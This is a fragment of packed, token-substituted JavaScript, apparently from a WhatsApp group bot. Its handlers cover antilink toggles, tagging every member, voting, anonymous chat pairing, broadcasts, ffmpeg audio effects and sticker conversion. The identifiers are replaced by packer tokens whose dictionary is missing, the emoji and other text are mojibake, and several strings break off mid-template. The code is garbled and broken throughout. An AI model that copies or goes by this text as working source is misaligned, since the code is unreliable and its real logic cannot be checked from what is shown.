C.ON(m.E,D).1u((2c)=>m.z(J.4X)).1j((P)=>m.z(2I(P)))}G l\'OM\':{if(!2b)Q J.2j if(!H)Q`3U/3a 3x 4i 4n ${j+K}`if(!/U/.1t(2Y))Q`3U/3a 3x 4i 4n ${j+K}`if(/8m/.1t(2Y))Q`3U/3a 3x 4i 4n ${j+K}`B 1S=F C.5v(H)F C.ze(6K,{R:1S}).1j((P)=>fs.3j(1S))m.z(J.4X)}G l\'OL\':l\'OK\':l\'oC\':{if(!m.1N)Q J.1v if(!2G)Q J.2r if(!H)Q`3U/3a 3x 4i 4n ${j+K}`if(!/U/.1t(2Y))Q`3U/3a 3x 4i 4n ${j+K}`if(/8m/.1t(2Y))Q`3U/3a 3x 4i 4n ${j+K}`B 1S=F C.5v(H)F C.ze(m.E,{R:1S}).1j((P)=>fs.3j(1S))m.z(J.4X)}G l\'ow\':{if(!m.1N)Q J.1v if(!2M)Q J.3h if(!2G)Q J.2r B 1Y=`🔖•š🔖»Ë™Î‡Ù 🔖€¢🔖—🔖™¥dI bi🔖™¥🔖—🔖€¢Ù Î‡Ë™🔖«🔖•🔖Œ¿*4B:${q?q:\'ti\'}*\\n\\n`1U(B ac of 3V){1Y+=`${1H}@${ac.id.1h(\'@\')[0]}\\n`}C.N(m.E,{D:1Y,3y:3V.2L(a=>a.id)},{H:m})}G l\'ox\':{if(!m.1N)Q J.1v if(!2M)Q J.3h if(!2G)Q J.2r C.N(m.E,{D:q?q:\'\',3y:3V.2L(a=>a.id)},{H:m})}G l\'5c\':l\'cy\':{if(!a7&&W.db.M.3M[m.1l].a6<1)L m.z(J.OJ)db.M.3M[m.1l].a6-=1 B{cy}=1P(\'./3k/aq\')if(!D)Q\'4c 9a D!\'B 1r=F cy(D)B 1Y=`OI gz 9e ${D}\\n\\n`1U(B i of 1r){1Y+=`${1H}*${i.2m}*:${i.1E}\\n\\n`}m.z(1Y)}G l\'2E\':{if(!m.1N)Q J.1v if(m.E in 2E)Q`OH 4y 5w aB in 1o E!4f\\n\\n*${j}aA*-to 2y aB`if(!D)Q`4c e2 1U gj,2o:*${j+K}OG 3q*`m.z(`gj OF!\\n\\n*${j}7V*-1U tc\\n*${j}7q*-1U 7q\\n*${j}OE*-to 9o 1n 2E\\n*${j}aA*-to 2y aB`)2E[m.E]=[q,[],[]]F 7G(cb)7V=2E[m.E][1]7q=2E[m.E][2]9t=`*ã€Œ8bã€**e2:*${2E[m.E][0]}🔖”Œã€”gYã€•🔖”‚🔖”œ9u:${2E[m.E][1].1F}🔖”‚🔖”‚🔖””🔖”€🔖”€🔖”€🔖”€🔖”Œã€”gXã€•🔖”‚🔖”œ9u:${2E[m.E][2].1F}🔖”‚🔖”‚🔖””🔖”€🔖”€🔖”€🔖”€*${j}aA*-to 2y aB`B zd=[{1g:`${j}7V`,1e:{1f:\'ðš„ð™¿ðš…ð™¾ðšƒð™´\'},V:1},{1g:`${j}7q`,1e:{1f:\'ð™³ð™´ðš…ð™¾ðšƒð™´\'},V:1}]B zc={D:9t,1J:C.2f.2m,1c:zd,1G:1}C.N(m.E,zc)}G l\'7V\':{if(!m.1N)Q J.1v if(!(m.E in 2E))Q`4f*no 9s in 1o 1v!*4f\\n\\n*${j}2E*-to 6m 9s`h2=2E[m.E][1].h0(2E[m.E][2])h1=h2.2i(m.1l)if(h1)Q\'4e 3P z9\'2E[m.E][1].3e(m.1l)gZ=2E[m.E][1].h0(2E[m.E][2])9t=`*ã€Œ8bã€**e2:*${2E[m.E][0]}🔖”Œã€”gYã€•🔖”‚🔖”œ9u:${2E[m.E][1].1F}${2E[m.E][1].2L((v,i)=>`🔖”œ${i+1}.@${v.1h`@`[0]}`).2t(\'\\n\')}🔖”‚🔖””🔖”€🔖”€🔖”€🔖”€🔖”Œã€”gXã€•🔖”‚🔖”œ9u:${2E[m.E][2].1F}${2E[m.E][2].2L((v,i)=>`🔖”œ${i+1}.@${v.1h`@`[0]}`).2t(\'\\n\')}🔖”‚🔖””🔖”€🔖”€🔖”€🔖”€*${j}aA*-to 2y aB`B zb=[{1g:`${j}7V`,1e:{1f:\'ðš„ð™¿ðš…ð™¾ðšƒð™´\'},V:1},{1g:`${j}7q`,1e:{1f:\'ð™³ð™´ðš…ð™¾ðšƒð™´\'},V:1}]B za={D:9t,1J:C.2f.2m,1c:zb,1G:1,3y:gZ}C.N(m.E,za)}G l\'7q\':{if(!m.1N)Q J.1v if(!(m.E in 2E))Q`4f*no 9s in 1o 1v!*4f\\n\\n*${j}2E*-to 6m 9s`h2=2E[m.E][1].h0(2E[m.E][2])h1=h2.2i(m.1l)if(h1)Q\'4e 3P z9\'2E[m.E][2].3e(m.1l)gZ=2E[m.E][1].h0(2E[m.E][2])9t=`*ã€Œ8bã€**e2:*${2E[m.E][0]}🔖”Œã€”gYã€•🔖”‚🔖”œ9u:${2E[m.E][1].1F}${2E[m.E][1].2L((v,i)=>`🔖”œ${i+1}.@${v.1h`@`[0]}`).2t(\'\\n\')}🔖”‚🔖””🔖”€🔖”€🔖”€🔖”€🔖”Œã€”gXã€•🔖”‚🔖”œ9u:${2E[m.E][2].1F}${2E[m.E][2].2L((v,i)=>`🔖”œ${i+1}.@${v.1h`@`[0]}`).2t(\'\\n\')}🔖”‚🔖””🔖”€🔖”€🔖”€🔖”€*${j}aA*-to 2y aB`B z8=[{1g:`${j}7V`,1e:{1f:\'ðš„ð™¿ðš…ð™¾ðšƒð™´\'},V:1},{1g:`${j}7q`,1e:{1f:\'ð™³ð™´ðš…ð™¾ðšƒð™´\'},V:1}]B z7={D:9t,1J:C.2f.2m,1c:z8,1G:1,3y:gZ}C.N(m.E,z7)}G l\'oi\':if(!m.1N)Q J.1v if(!(m.E in 2E))Q`4f*no 9s in 1o 1v!*4f\\n\\n*${j}2E*-to 6m 9s`9t=`*ã€Œ8bã€**e2:*${2E[m.E][0]}🔖”Œã€”gYã€•🔖”‚🔖”œ9u:${7V.1F}${2E[m.E][1].2L((v,i)=>`🔖”œ${i+1}.@${v.1h`@`[0]}`).2t(\'\\n\')}🔖”‚🔖””🔖”€🔖”€🔖”€🔖”€🔖”Œã€”gXã€•🔖”‚🔖”œ9u:${7q.1F}${2E[m.E][2].2L((v,i)=>`🔖”œ${i+1}.@${v.1h`@`[0]}`).2t(\'\\n\')}🔖”‚🔖””🔖”€🔖”€🔖”€🔖”€*${j}aA*-to 2y aB🔖©${C.2f.id}`C.ca(m.E,9t,m)G l\'aA\':l\'og\':l\'OD\':{if(!m.1N)Q J.1v if(!(m.E in 2E))Q`4f*no 9s in 1o 1v!*4f\\n\\n*${j}2E*-to 6m 9s`2y 2E[m.E]m.z(\'6L OC gj dU In OB 5H\')}G l\'1v\':l\'ag\':{if(!m.1N)Q J.1v if(!2M)Q J.3h if(!2G)Q J.2r if(1s[0]===\'dK\'){F C.gW(m.E,\'OA\').1u((2c)=>m.z(`*6L Oz 1X 5H*`)).1j((P)=>m.z(2I(P)))}1y if(1s[0]===\'gV\'){F C.gW(m.E,\'Oy\').1u((2c)=>m.z(`*6L z6 1X 5H*`)).1j((P)=>m.z(2I(P)))}1y{B 1c=[{1g:\'1v gV\',1e:{1f:\'pM\'},V:1},{1g:\'1v dK\',1e:{1f:\'r9\'},V:1}]F C.2a(m.E,1c,`gU 5H`,1b,m)}}G l\'dc\':{if(!m.1N)Q J.1v if(!2M)Q J.3h if(!2G)Q J.2r if(1s[0]===\'gV\'){F C.gW(m.E,\'Ox\').1u((2c)=>m.z(`*6L z6 r8 5H dT*`)).1j((P)=>m.z(2I(P)))}1y if(1s[0]===\'dK\'){F C.gW(m.E,\'c6\').1u((2c)=>m.z(`*6L r9 r8 5H dT*`)).1j((P)=>m.z(2I(P)))}1y{B 1c=[{1g:\'dc gV\',1e:{1f:\'pM\'},V:1},{1g:\'dc dK\',1e:{1f:\'r9\'},V:1}]F C.2a(m.E,1c,`gU r8 dT`,1b,m)}}G l\'6a\':{if(!m.1N)L m.z(J.1v)if(!2M)L m.z(J.3h)if(!2G&&!2b)L m.z(J.2r)if(1s[0]==="on"){if(8k)L m.z(\'3n 4C\')e1.3e(1k)m.z(\'3F in 3X on 6a in 1o 1v\')1m 3Z=F C.4M(1k)1m 3I=3Z[\'3V\']1m 2U=[]3I.2L(4A 3Y=>{2U.3e(3Y.id.3m(\'c.us\',\'s.2d.2q\'))})C.N(1k,{D:`\\`\\`\\`🔖6B🔖\\`\\`\\`\\n\\Ow(4D Ov 1U Ou)qN 3G 4x Ot in 1o 1v,fT Os 8e 4t Or Oq Op 1k 1n 6X!`,2Q:{2B:2U}},{H:m})}1y if(1s[0]==="1A"){if(!8k)L m.z(\'3n 5m\')B 1A=e1.5l(1k)e1.4Y(1A,1)m.z(\'3F in 3X 1A 6a in 1o 1v\')}1y{B z5=[{1g:`${K}on`,1e:{1f:\'On\'},V:1},{1g:`${K}1A`,1e:{1f:\'5M\'},V:1}]F C.2a(m.E,z5,`3T 5L 1n 4k 4d\\n\\6A to 5k\\6z to 4P`,`${W.1b}`,m)}}G l\'fq\':{if(!m.1N)Q J.1v if(!2M)Q J.3h if(!2G)Q J.2r if(1s[0]==="on"){if(db.M.4g[m.E].3s)L m.z(`*It\'s r6 r5 gT*`)db.M.4g[m.E].3s=2l m.z(`*r7 z4 r5!*`)}1y if(1s[0]==="1A"){if(!db.M.4g[m.E].3s)L m.z(`*dN z3 gT*`)db.M.4g[m.E].3s=1Z m.z(`*r7 z4 Oo!*`)}1y{B 1c=[{1g:\'3s on\',1e:{1f:\'On\'},V:1},{1g:\'3s 1A\',1e:{1f:\'5M\'},V:1}]F C.2a(m.E,1c,`gU r7`,1b,m)}}G l\'5z\':{if(!m.1N)Q J.1v if(!2M)Q J.3h if(!2G)Q J.2r if(1s[0]==="on"){if(db.M.4g[m.E].5z)L m.z(`It\'s r6 r5 gT`)db.M.4g[m.E].5z=2l m.z(`${C.2f.2m}3G 4x Om in 1o 1v!`)}1y if(1s[0]==="1A"){if(!db.M.4g[m.E].5z)L m.z(`dN z3 gT`)db.M.4g[m.E].5z=1Z m.z(`${C.2f.2m}3G 4x Ol in 1o 1v!`)}1y{B 1c=[{1g:\'5z on\',1e:{1f:\'On\'},V:1},{1g:\'5z 1A\',1e:{1f:\'5M\'},V:1}]F C.2a(m.E,1c,`Oj bk`,1b,m)}}G l\'kz\':{if(!m.H)m.z(\'3a 4B\')B 2K=F m.yY()if(!m.H.ef)L m.z(\'1X 1W 7c 4D 5q by a 6X!\')B 1Y=\'\'1U(B i of 2K.Oi){B 7u=i.Oh B gS=i.Og B au=7u?7u:gS 1Y+=`${W.1H}@${i.bn.1h(\'@\')[0]}\\n`1Y+=`🔖”—🔖”${W.1H}*9r:*${8i(au*cb).5g(\'DD/MM/Oe HH:mm:ss\')}${W.1H}*Od:*${7u?\'wv\':\'qL\'}\\n\\n`}C.ca(m.E,1Y,m)}G l\'Oc\':l\'Ob\':l\'r4\':l\'oE\':{if(!m.1N)Q J.1v if(!2M)Q J.3h B Oa=F C.O9(m.E)C.3A(m.E,`S:}G l\'oD\':{if(!m.1N)Q J.1v if(!2M)Q J.3h if(!2G)Q J.2r if(!D)Q\'4c 1n 8c 5k/4P\'if(1s[0]===\'5k\'){F C.N(m.E,{z1:z2}).1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}1y if(1s[0]===\'4P\'){F C.N(m.E,{z1:1Z}).1u((2c)=>m.z(2I(2c))).1j((P)=>m.z(2I(P)))}}G l\'2y\':l\'O8\':{if(!m.H)Q 1Z B{E,3B,id,ef}=m.H if(!ef)Q\'1X 1W 7c 4D 5q by a 6X!\'C.N(m.E,{2y:{5d:m.E,3B:2l,id:m.H.id,4K:m.H.1l}})}G l\'ei\':l\'kw\':{if(!D)Q`2o:${j+K}r3 an 6h qN`B 5j=dg+\'@s.2d.2q\'B me=m.1l B c0=`4B 9e:@${me.1h(\'@\')[0]}\\qM:@${5j.1h(\'@\')[0]}\\n\\n${D}`B 5u=[5j,me]B 1c=[{1g:\'7i\',1e:{1f:\'🔖™z0 tk O7 O6\'},V:1}]F C.2a(5j,1c,c0,1b,m,{3y:5u})B bZ=`r3 qL\\y3 3q@${5j.1h(\'@\')[0]}\\n*O5 1a 1U 1n ei🔖™*\\O4 8J 5N be O3\\yZ 1n r3 is O2 O1`F C.2a(m.E,1c,bZ,1b,m,{3y:5u})}G l\'7i\':{gR={8I:{D:\'🔖¤\',2n:{5d:m.E,3B:2l,id:H.id}}}C.N(m.E,gR)}G G l\'bc\':l\'5V\':if(!2b)Q J.2j if(1s.1F<2)Q`4c D`1m M=F c9.4g.7Y()1U(B i of M){C.N(i.id,{D:`${6d}\'s O0\\n\\n${q}`})F 7G(cb)}G l\'q\':l\'H\':{if(!m.H)L m.z(\'3a 4B!!\')B r2=F C.NZ(F m.yY())if(!r2.H)L m.z(\'1X 1W 1a NY to pF 4D NX a z\')F r2.H.ee(m.E,2l)}G l\'ky\':{B 1r=F c9.4g.7Y().5O(v=>v.id.eh(\'.2q\')).2L(v=>v.id)B 1Y=`🔖¬£*NW oM qZ*\\n\\yX 8K:${1r.1F}8K\\n\\n`1U(B i of 1r){B 9g=c9.6G[i].NV[0].e0 1Y+=`${1H}*bV:*${9g}\\n${1H}*NU:*@${i.1h(\'@\')[0]}\\n${1H}*8K:*S:}C.ca(m.E,1Y,m)}G l\'kx\':{B 1r=F c9.4g.7Y().5O(v=>v.id.eh(\'@g.us\')).2L(v=>v.id)B 1Y=`🔖¬£*oF oM qZ*\\n\\yX 5H:${1r.1F}5H\\n\\n`1U(B i of 1r){B az=F C.4M(i)1Y+=`${1H}*bV:*${az.oR}\\n${1H}*3q:*${az.2j!==hE?\'@\'+az.2j.1h`@`[0]:\'NT\'}\\n${1H}*ID:*${az.id}\\n${1H}*1L:*${8i(az.qy*cb).tz(\'dZ/dY\').5g(\'DD/MM/yW HH:mm:ss\')}\\n${1H}*qm:*${az.3V.1F}\\n\\n🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€\\n\\n`}C.ca(m.E,1Y,m)}G l\'NS\':l\'NR\':{B id=1s&&/\\d+\\-\\d+@g.us/.1t(1s[0])?1s[0]:m.E B 1D=[...3R.7X(c9.NQ[id]),6K]C.3A(m.E,\'yV 3L:\\n\\n\'+1D.2L(v=>\' @\'+v.3m(/@.+/,\'\')).2t`\\n`,m,{3y:1D})}G l\'nC\':{if(!D)Q`2o:${j+K}D`B{yU}=1P(\'./3k/yT\')B eb=F yU(D)m.z(eb)}G l\'nB\':{if(!D)Q`2o:${j+K}D`B{yS}=1P(\'./3k/yT\')B db=F yS(D)m.z(db)}G l\'eQ\':l\'eP\':l\'cx\':l\'eO\':l\'eN\':l\'eM\':l\'eL\':l\'cw\':l\'eK\':l\'eJ\':l\'yO\':l\'nz\':6p{B 5x if(/eQ/.1t(K))5x=\'-af NP=f=54:NN=o:yR=2:g=20\'if(/eP/.1t(K))5x=\'-af NM=.1:1:64:0:1B\'if(/cx/.1t(K))5x=\'-af c8=4/4,c7=NL*2/3\'if(/eO/.1t(K))5x=\'-af 9U=12\'if(/eN/.1t(K))5x=\'-5O:a "c8=1.63,c7=r0"\'if(/eM/.1t(K))5x=\'-5O:a "c8=1.6,c7=NK"\'if(/eL/.1t(K))5x=\'-5O:a c8=1.r1,c7=r0*1.25\'if(/cw/.1t(K))5x=\'-yQ "NJ"\'if(/eK/.1t(K))5x=\'-yQ "NI=NH=\\\'yP(re,im)*dX(0)\\\':NG=\\\'yP(re,im)*NF(0)\\\':NE=ND:NC=0.75"\'if(/eJ/.1t(K))5x=\'-5O:a "c8=0.7,c7=r0"\'if(/yO/.1t(K))5x=\'-5O:v "NB=\\\'NA=Nz:Ny=Nx:Nw=1:Nv=Nu\\\'"\'if(/Nt/.1t(K))5x=\'-5O:a "c8=0.5,c7=Ns"\'if(/2H/.1t(2Y)){m.z(J.1i)B 1S=F C.5v(H)B 9m=8P(\'.9c\')6P(`bS-i ${1S}${5x}${9m}`,(P,bR,7P)=>{fs.3j(1S)if(P)L m.z(P)B 6w=fs.3E(9m)C.N(m.E,{2H:6w,3C:\'2H/8n\'},{H:m})fs.3j(9m)})}1y m.z(`3a to 1n 2H 1a 8W to bL 3N a Y*${j+K}*`)}1j(e){m.z(e)}G l\'kM\':{if(!m.H)Q\'3a 4B!\'if(!m.H.6W)Q\'yM gQ yL\'if(!D)Q`c5 3o Nr?`B 5y=m.H.6W.dW(\'8R\')if(W.db.M.2R[5y]&&W.db.M.2R[5y].c6)Q\'4e 3P no yN to bL 1o 2R K\'W.db.M.2R[5y]={D,2B:m.2B,ps:m.1l,at:+4v 7j,c6:1Z,}m.z(`dQ!`)}G l\'kK\':{B 5y=m.H.6W.dW(\'8R\')if(!5y)Q`No Nq`if(W.db.M.2R[5y]&&W.db.M.2R[5y].c6)Q\'4e 3P no yN to 2y 1o 2R K\'2y W.db.M.2R[5y]m.z(`dQ!`)}G l\'kL\':{B 1Y=`*3L gQ*dT:*Np*5y is Nn ${3R.yI(W.db.M.2R).2L(([2n,8c],7F)=>`${7F+1}.${8c.c6?`*${2n}*`:2n}:${8c.D}`).2t(\'\\n\')}`.5p()C.3A(m.E,1Y,m,{3y:3R.5Z(W.db.M.2R).2L(x=>x.2B).qX((a,b)=>[...a,...b],[])})}G l\'kJ\':{if(!2b)Q J.2j if(!m.H)Q\'3a 4B!\'if(!m.H.6W)Q\'yM gQ yL\'B 5y=m.H.6W.dW(\'8R\')if(!(5y in W.db.M.2R))Q\'gQ 4D qj in 4p\'W.db.M.2R[5y].c6=!/^un/i.1t(K)m.z(\'dQ!\')}G l\'kI\':{if(!m.H)Q\'3a 4B 4e 8o To Nm In el\'if(!D)Q`2o:${j+K}dL`B 5U=W.db.M.4p if(D.3c()in 5U)Q`\'${D}\'Nl in 1n 1W 6c`5U[D.3c()]=H.yK m.z(`6L Nk 1W in 1W 6c as\'${D}\'Nj 3N ${j}ek ${D}Ni 6c of Nh 4i ${j}cn`)}G l\'ek\':{if(!D)Q`2o:${j+K}aL 2m\\n\\Ng 1W 6c 3N ${j}cn`B 5U=W.db.M.4p if(!(D.3c()in 5U))Q`\'${D}\'4D yE in 1n 1W 6c`C.ee(m.E,5U[D.3c()],2l)}G l\'cn\':{B 5U=4L.ay(fs.3E(\'./yJ/4p.4j\'))B yG=3R.yI(W.db.M.4p).2L(([9g,yH])=>{L{9g,...yH}})B 1Y=\'ã€Œ kN qZ ã€\\n\\n\'1U(B i of yG){1Y+=`${1H}*bV:*${i.9g}\\n${1H}*dM:*${yF(i.1W).3m(/4B/i,\'\')}\\n🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€\\n\\n`}m.z(1Y)}G l\'kH\':l\'Nf\':{B 5U=W.db.M.4p if(!(D.3c()in 5U))L m.z(`\'${D}\'4D yE in 1n 1W 6c`)2y 5U[D.3c()]m.z(`6L yD\'${D}\'1k 1n 1W 6c`)}G l\'3f\':{if(m.1N)L m.z(\'3D dV Be gP c5 gO!\')1o.3f=1o.3f?1o.3f:{}B 1c=[{1g:\'6m\',1e:{1f:\'qY\'},V:1}]C.2a(m.E,1c,`\\`\\`\\`Hi ${F C.tm(m.1l)}uS To 9M 8K\\n\\Ne 1n 4k 4d to 4U a bI\\`\\`\\``,1b,m)}G l\'c3\':l\'aM\':{if(m.1N)L m.z(\'3D dV Be gP c5 gO!\')1o.3f=1o.3f?1o.3f:{}B 1x=3R.5Z(1o.3f).4U(1x=>1x.9o(m.1l))if(!1x){B 1c=[{1g:\'6m\',1e:{1f:\'qY\'},V:1}]F C.2a(m.E,1c,`\\`\\`\\`4e Nd dN In 9M dU,9q 7s To Nc 8z\\`\\`\\``)Q 1Z}m.z(\'Ok\')B 5X=1x.5X(m.1l)if(5X)F C.3A(5X,`\\`\\`\\`8z 5R yC 9M dU\\`\\`\\``,m)2y 1o.3f[1x.id]if(K===\'aM\')G}l\'Nb\':l\'6m\':{if(m.1N)L m.z(\'3D dV Be gP c5 gO!\')1o.3f=1o.3f?1o.3f:{}if(3R.5Z(1o.3f).4U(1x=>1x.9o(m.1l))){B 1c=[{1g:\'c3\',1e:{1f:\'8y\'},V:1}]F C.2a(m.E,1c,`\\`\\`\\`4e 4y 5w in an 3f gN,9p 1n 4k 4d to Na 2h 3f gN\\`\\`\\``,1b,m)Q 1Z}B 1x=3R.5Z(1o.3f).4U(1x=>1x.5Y===\'c4\'&&!1x.9o(m.1l))if(1x){B 1c=[{1g:\'9L\',1e:{1f:\'yB\'},V:1},{1g:\'c3\',1e:{1f:\'8y\'},V:1}]F C.2a(1x.a,1c,`\\`\\`\\`6L gL 8z,8h 1a 4t 2F 6G\\`\\`\\``,1b,m)1x.b=m.1l 1x.5Y=\'hF\'F C.2a(1x.b,1c,`\\`\\`\\`6L gL 8z,8h 1a 4t 2F 6G\\`\\`\\``,1b,m)}1y{B id=+4v 7j 1o.3f[id]={id,a:m.1l,b:\'\',5Y:\'c4\',9o:8A(3g=\'\'){L[1o.a,1o.b].2i(3g)},5X:8A(3g=\'\'){L 3g===1o.a?1o.b:3g===1o.b?1o.a:\'\'},}B 1c=[{1g:\'c3\',1e:{1f:\'8y\'},V:1}]F C.2a(m.E,1c,`\\`\\`\\`3T 1i,ga 1U a bI\\`\\`\\``,1b,m)}G}l\'9L\':l\'N9\':{if(m.1N)L m.z(\'3D dV Be gP c5 gO!\')1o.3f=1o.3f?1o.3f:{}B gM=3R.5Z(1o.3f).4U(1x=>1x.9o(m.1l))if(!gM){B 1c=[{1g:\'6m\',1e:{1f:\'qY\'},V:1}]F C.2a(m.E,1c,`\\`\\`\\`4e 4y 4D in an 3f gN,9p 1n 4k to 4U a bI\\`\\`\\``)Q 1Z}B 5X=gM.5X(m.1l)if(5X)F C.3A(5X,`\\`\\`\\`8z 5R yC 9M dU\\`\\`\\``,m)2y 1o.3f[gM.id]B 1x=3R.5Z(1o.3f).4U(1x=>1x.5Y===\'c4\'&&!1x.9o(m.1l))if(1x){B 1c=[{1g:\'9L\',1e:{1f:\'yB\'},V:1},{1g:\'c3\',1e:{1f:\'8y\'},V:1}]F C.2a(1x.a,1c,`\\`\\`\\`6L gL 8z,8h 1a 4t 2F 1W\\`\\`\\``,1b,m)1x.b=m.1l 1x.5Y=\'hF\'F C.2a(1x.b,1c,`\\`\\`\\`6L gL 8z,8h 1a 4t 2F 1W\\`\\`\\``,1b,m)}1y{B id=+4v 7j 1o.3f[id]={id,a:m.1l,b:\'\',5Y:\'c4\',9o:8A(3g=\'\'){L[1o.a,1o.b].2i(3g)},5X:8A(3g=\'\'){L 3g===1o.a?1o.b:3g===1o.b?1o.a:\'\'},}B 1c=[{1g:\'c3\',1e:{1f:\'8y\'},V:1}]F C.2a(m.E,1c,`\\`\\`\\`3T 1i,ga 1U a bI\\`\\`\\``,1b,m)}G}l\'a5\':{if(!2b)Q J.2j C.a5=2l m.z(\'*p5 in yA To sR qS*\')}G l\'oL\':{if(!2b)Q J.2j C.a5=1Z m.z(\'*p5 in yA To sQ qS*\')}G l\'kA\':l\'p\':l\'N8\':l\'N7\':{1d dE=bm.N6()1d ax=os.ax().2L(4a=>{4a.c2=3R.7X(4a.5f).qX((4w,V)=>4w+4a.5f[V],0)L 4a})1d 4a=ax.qX((4w,4a,4f,{1F})=>{4w.c2+=4a.c2 4w.6V+=4a.6V/1F 4w.5f.2f+=4a.5f.2f 4w.5f.qW+=4a.5f.qW 4w.5f.qV+=4a.5f.qV 4w.5f.qU+=4a.5f.qU 4w.5f.qT+=4a.5f.qT L 4w},{6V:0,c2:0,5f:{2f:0,qW:0,qV:0,qU:0,qT:0}})B gD=6V()B yz=6V()-gD yx=gK.8h()yy=gK.8h()yq=`N5 yp ${yz.df(4)}N4\\n${yy-yx}N3\\n\\N2:${a8(bm.bl())}🔖’»dT wx N1:${gJ(os.yw()-os.N0())}/${gJ(os.yw())}MZ MX MW ${3R.7X(dE).2L((2n,4f,7E)=>`${2n.qR(1C.6H(...7E.2L(v=>v.1F)),\' \')}:${gJ(dE[2n])}`).2t(\'\\n\')}${ax[0]?`MV yu MU ${ax[0].ys.5p()}(${4a.6V}yr)\\n${3R.7X(4a.5f).2L(V=>`-*${(V+\'*\').qR(6)}:${(7t*4a.5f[V]/4a.c2).df(2)}%`).2t(\'\\n\')}MT yv(s)qS(${ax.1F}yv yu)4f ${ax.2L((4a,i)=>`${i+1}.${4a.ys.5p()}(${4a.6V}yr)\\n${3R.7X(4a.5f).2L(V=>`-*${(V+\'*\').qR(6)}:${(7t*4a.5f[V]/4a.c2).df(2)}%`).2t(\'\\n\')}`).2t(\'\\n\\n\')}`:\'\'}`.5p()m.z(yq)}G l\'kB\':{m.z(\'MS yp...\')B cp=1P(\'yo\')B{yn}=1P(\'5C\')B 6P=yn(cp.6P).MR(cp)B o 6p{o=F 6P(\'MQ 6V.py\')}1j(e){o=e}MP{B{7P,bR}=o if(7P.5p())m.z(7P)if(bR.5p())m.z(bR)}}G l\'2j\':l\'ps\':{C.MO(m.E,W.2j,m)}G l\'dS\':{if(!2b)Q J.2j B 5e=db.M.c1[6K]if(1s[0]===\'8r\'){5e.8r=2l 5e.8q=1Z 5e.8p=1Z 5e.aw=1Z m.z(J.4X)}1y if(1s[0]===\'8q\'){5e.8r=1Z 5e.8q=2l 5e.8p=1Z 5e.aw=1Z m.z(J.4X)}1y if(1s[0]===\'8p\'){5e.8r=1Z 5e.8q=1Z 5e.8p=2l 5e.aw=1Z m.z(J.4X)}1y if(1s[0]===\'yl\'){5e.8r=1Z 5e.8q=1Z 5e.8p=1Z 5e.aw=2l m.z(J.4X)}1y{B fw=[{2e:"MN ML MK",de:[{2e:"9n 3x",3K:`dS 8r`,3r:`gI 5D 6X to 9n 3x`},{2e:"9n 4E",3K:`dS 8q`,3r:`gI 5D 6X to 9n 4E`},{2e:"9n ym",3K:`dS 8p`,3r:`gI 5D 6X to 9n ym`},{2e:"9n 4B",3K:`dS yl`,3r:`gI 5D 6X to 9n 4B`}]},]C.MJ(m.E,`6J MI*${7W}*1n 5x 5D!`,1b,`*MH MG*!`,`yk yj 2z`,fw,m)}}G l\'2R\':l\'s\':l\'MF\':l\'ME\':{if(!H)Q`*3a 4E/3x 4i 4n*${j+K}`m.z(J.1i)if(/U/.1t(2Y)){B 1S=F H.7h()B 3W=F C.5J(m.E,1S,m,{2N:W.2N,2u:W.2u})F fs.3j(3W)}1y if(/2V/.1t(2Y)){if((H.2K||H).7f>11)L m.z(\'*wq 10 7f!*\')B 1S=F H.7h()B 3W=F C.gg(m.E,1S,m,{2N:W.2N,2u:W.2u})F fs.3j(3W)}1y{Q`*3U 3x/4E 4i 4n*${j+K}\\MD*4E 1-9 wp*`}}G l\'m7\':{B[yi,yh]=D.1h`+`if(!yi)Q`2o:${j+K}🔖˜…+🔖¤”`if(!yh)Q`2o:${j+K}🔖˜…+🔖¤”`B 1r=F 3H(`S:1U(B 2c of 1r.yg){B 3W=F C.5J(m.E,2c.R,m,{2N:W.2N,2u:W.2u,yf:2c.ye})F fs.3j(3W)}}G l\'MC\':{if(!D)Q`2o:${j+K}🔖˜…`B 1r=F 3H(`S:1U(B 2c of 1r.yg){B 3W=F C.5J(m.E,2c.R,m,{2N:W.2N,2u:W.2u,yf:2c.ye})F fs.3j(3W)}}G l\'m6\':l\'eF\':{if(!D)Q`2o:${j+K}D`F C.uW(m.E,`S:}G l\'qQ\':{if(!D)Q`2o:${j+K}D`B qQ=F 3H(`S:C.N(m.E,{2H:{R:qQ.1E},3C:\'2H/6q\',5I:`${D}.9c`},{H:yd})}G l\'nK\':l\'MA\':{if(!H)Q\'3a 3x\'if(!/8m/.1t(2Y))Q`3a 2R 3N Y*${j+K}*`m.z(J.1i)B 1S=F C.5v(H)B 9m=F 8P(\'.tw\')6P(`bS-i ${1S}${9m}`,(P)=>{fs.3j(1S)if(P)Q P B 3b=fs.3E(9m)C.N(m.E,{U:3b},{H:m})fs.3j(9m)})}G l\'Mz\':l\'nI\':{if(!H)Q\'3a 3x\'if(!/8m/.1t(2Y))Q`z 2R 3N Y*${j+K}*`m.z(J.1i)B{bQ}=1P(\'./3k/ge\')B 1S=F C.5v(H)B gG=F bQ(1S)F C.N(m.E,{2V:{R:gG.1E,Y:\'7S y9 To 4E\'}},{H:m})F fs.3j(1S)}G l\'Mx\':l\'nD\':{if(!/2V/.1t(2Y)&&!/2H/.1t(2Y))Q`3U/3a 4E/6I 4e 8o to 1K as 6I 4i 4n ${j+K}`if(!H)Q`3U/3a 4E/6I 4e 8o to 1K as 6I 4i 4n ${j+K}`m.z(J.1i)B 1S=F H.7h()B{gH}=1P(\'./3k/qO\')B 2H=F gH(1S,\'6q\')C.N(m.E,{2H:2H,3C:\'2H/8n\'},{H:m})}G l\'nE\':{if(/6U/.1t(2Y))Q`3U/3a 4E/6I 4e 8o to 7S qP dR 4i 4n ${j+K}`if(!/2V/.1t(2Y)&&!/2H/.1t(2Y))Q`3U/3a 4E/6I 4e 8o to 7S qP dR 4i 4n ${j+K}`if(!H)Q`3U/3a 4E/6I 4e 8o to 7S qP dR 4i 4n ${j+K}`m.z(J.1i)B 1S=F H.7h()B{gH}=1P(\'./3k/qO\')B 2H=F gH(1S,\'6q\')C.N(m.E,{6U:2H,3C:\'2H/8n\',5I:`7S By ${C.2f.2m}.9c`},{H:m})}G 